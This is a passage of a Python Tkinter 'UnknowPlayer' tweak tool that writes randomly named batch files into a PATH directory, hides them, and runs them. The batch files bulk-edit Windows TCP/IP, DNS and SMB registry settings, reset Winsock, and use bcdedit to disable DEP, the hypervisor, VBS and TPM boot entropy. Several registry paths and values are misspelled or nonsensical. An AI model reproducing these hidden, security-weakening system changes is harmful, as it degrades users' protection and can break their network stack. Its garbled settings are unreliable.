Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "TcpWindowSize" /t REG_DWORD /d "1130458716" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{A0520609-B255-4E00-A46C-B22AB88F5823}" /v "TcpAckFrequency" /t REG_DWORD /d "70653669" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableConnectionRateLimiting" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableRSS" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSite" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSite" /t REG_DWORD /d "65536" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxSendFree" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNumConnections" /t REG_DWORD /d "16777214" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSite" /t REG_DWORD /d "64240" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSite" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SitReqBuf" /t REG_DWORD /d "17424" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Site" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxWorkItems" /t REG_DWORD /d "8192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxMpxCt" /t REG_DWORD /d "2048" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxCmds" /t REG_DWORD /d "2048" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "DisableStrictNameChecking" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MinimumDynamicBacklog" /t REG_DWORD /d "200" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaximumDynamicBacklog" /t REG_DWORD /d "20000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicBacklogGrowthDelta" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "10800" /f
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxCacheTtl" /t REG_DWORD /d "10800" /f
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxNegativeCacheTtl" /t REG_DWORD /d "0" /f

    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Hardcore3():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    bcdedit /set useplatformtick yes
    bcdedit /timeout 0
    bcdedit /set nx optout
    bcdedit /set bootux disabled
    bcdedit /set bootmenupolicy standard
    bcdedit /set hypervisorlaunchtype off
    bcdedit /set tpmbootentropy ForceDisable
    bcdedit /set quietboot yes
    bcdedit /set {globalsettings} custom:16000067 true
    bcdedit /set {globalsettings} custom:16000069 true
    bcdedit /set {globalsettings} custom:16000068 true
    bcdedit /set linearaddress57 OptOut
    bcdedit /set increaseuserva 268435328
    bcdedit /set firstmegabytepolicy UseAll
    bcdedit /set avoidlowmemory 0x8000000
    bcdedit /set nolowmem Yes
    bcdedit /set allowedinmemorysettings 0x0
    bcdedit /set isolatedcontext No
    bcdedit /set vsmlaunchtype Off
    bcdedit /set vm No
    bcdedit /set configaccesspolicy Default
    bcdedit /set MSI Default
    bcdedit /set usephysicaldestination No
    bcdedit /set usefirmwarepcisettings No''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Hardcore4():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    @echo off
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "28" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableRSS" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSize" /t REG_DWORD /d "65536" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "NumTcbTablePartitions" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxSendFree" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNumConnections" /t REG_DWORD /d "16777214" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpFinWait2Delay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\QoS" /v "Do not use NLA" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxCmds" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxThreads" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxCollectionCount" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "DisableLargeMtu" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "IoPageLockLimit" /t REG_DWORD /d "983040" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "17424" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxMpxCt" /t REG_DWORD /d "125" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "DisableStrictNameChecking" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxNegativeCacheTtl" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MinimumDynamicBacklog" /t REG_DWORD /d "20" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaximumDynamicBacklog" /t REG_DWORD /d "1000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicBacklogGrowthDelta" /t REG_DWORD /d "10" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\CurrentVersion\Internet Settings" /v "DnsCacheEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\CurrentVersion\Internet Settings" /v "DnsCacheEntries" /t REG_DWORD /d "512" /f
Reg.exe add "HKCU\Software\Microsoft\CurrentVersion\Internet Settings" /v "DnsCacheTimeout" /t REG_DWORD /d "96" /f
netsh int ip reset C:/resetlog.txt
netsh winsock reset
ipconfig /flushdns
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    os.system('cls')
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Hardcore5():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    @echo off
for /f "usebackq" %%i in (`reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces`) do (
Reg.exe add %%i /v "TcpAckFrequency" /d "1" /t REG_DWORD /f
Reg.exe add %%i /v "TCPNoDelay" /d "1" /t REG_DWORD /f
Reg.exe add %%i /v "TCPDelAckTicks" /d "0" /t REG_DWORD /f
Reg.exe add %%i /v "TcpWindowSize" /d "65535" /t REG_DWORD /f
)
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableRSS" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSize" /t REG_DWORD /d "65536" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxSendFree" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNumConnections" /t REG_DWORD /d "16777214" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpFinWait2Delay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\QoS" /v "Do not use NLA" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxCmds" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxThreads" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "MaxCollectionCount" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "DisableLargeMtu" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "IoPageLockLimit" /t REG_DWORD /d "983040" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "17424" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxMpxCt" /t REG_DWORD /d "125" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "DisableStrictNameChecking" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "10800" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheTtl" /t REG_DWORD /d "10800" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxSOACacheEntryTtlLimit" /t REG_DWORD /d "301" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableSize" /t REG_DWORD /d "384" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableBucketSize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxNegativeCacheTtl" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MinimumDynamicBacklog" /t REG_DWORD /d "20" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaximumDynamicBacklog" /t REG_DWORD /d "1000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicBacklogGrowthDelta" /t REG_DWORD /d "10" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\CurrentVersion\Internet Settings" /v "DnsCacheEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\CurrentVersion\Internet Settings" /v "DnsCacheEntries" /t REG_DWORD /d "512" /f
Reg.exe add "HKCU\Software\Microsoft\CurrentVersion\Internet Settings" /v "DnsCacheTimeout" /t REG_DWORD /d "96" /f
netsh int ip reset C:/resetlog.txt
netsh winsock reset
ipconfig /flushdns
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)

def bugtalk():
    webbrowser.open("https://discord.gg/TJ56eYqqSq")


lobby = Tk()
lobby.title("UnknowPlayer By ! Sonic . exe#6074")
lobby.geometry("700x500")
lobby.resizable(width=False, height=False)

notebook = ttk.Notebook(lobby)
tab1 = Frame(notebook)
tab2 = Frame(notebook)
notebook.add(tab1,text="Home")
notebook.add(tab2,text="Hardcore Mode Punch")

notebook.pack()
Label(tab1,text="UnknowPlayer V1",font=300).pack()
Label(tab1,text="รายละเอียดเกี่ยวกับตัวโปรแกรม",font=250).pack()
Label(tab1,text="เป็นที่ทราบกันดีโปรแกรมนี้ถูกจัดทำขึ้นโดย Sonic เหตุผลที่สร้างโปรแกรมนี้ขึ้นมา",font=180).pack()
